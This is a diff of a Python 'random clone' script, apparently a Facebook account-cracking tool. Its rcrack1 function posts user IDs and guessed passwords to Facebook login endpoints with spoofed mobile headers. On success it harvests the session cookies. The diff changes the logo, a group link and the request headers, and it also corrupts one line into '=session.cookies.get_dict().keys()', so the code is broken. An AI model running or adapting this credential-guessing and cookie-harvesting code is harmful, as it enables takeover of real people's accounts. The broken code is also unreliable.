@@ -123,10 +123,12 @@ for txxxtt in range (1000):
 #--------------------------(LOGO BOX)--------------------------#
 logo= ("""
 
-███████████████████████████████████
-█─▄▄▄▄██▀▄─██▄─▄─▀█▄─▄─▀█▄─▄█▄─▄▄▀█
-█▄▄▄▄─██─▀─███─▄─▀██─▄─▀██─███─▄─▄█
-▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▀▀▄▄▄▄▀▀▄▄▄▀▄▄▀▄▄▀   
+░██████╗░█████╗░██████╗░██████╗░██╗██████╗░
+██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
+╚█████╗░███████║██████╦╝██████╦╝██║██████╔╝
+░╚═══██╗██╔══██║██╔══██╗██╔══██╗██║██╔══██╗
+██████╔╝██║░░██║██████╦╝██████╦╝██║██║░░██║
+╚═════╝░╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝╚═╝░░╚═╝   
 \033[1;32m═══════════════════════════════════════════════════════════════\033[0m                                                     
 \033[0;101m                        ASSLAMUALAIKUM                         \033[0m
 \033[1;97m---------------------------------------------------------------
@@ -147,7 +149,7 @@ class Main:
         self.loop = 0
         os.system("clear")
         print(logo)
-    #    os.system('xdg-open fb://groups/s1911181217/?ref=share&mibextid=NSMWBT')
+    #    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
         print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START RANDOM CLONE')
         print('\033[1;31m[\033[1;32m2\033[1;31m]  \x1b[38;5;46m EXIT')
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
@@ -221,7 +223,7 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'm.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
@@ -239,10 +241,9 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-            'viewport-width': '980}',
-            }
+            'viewport-width': '980',}
             lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            =session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
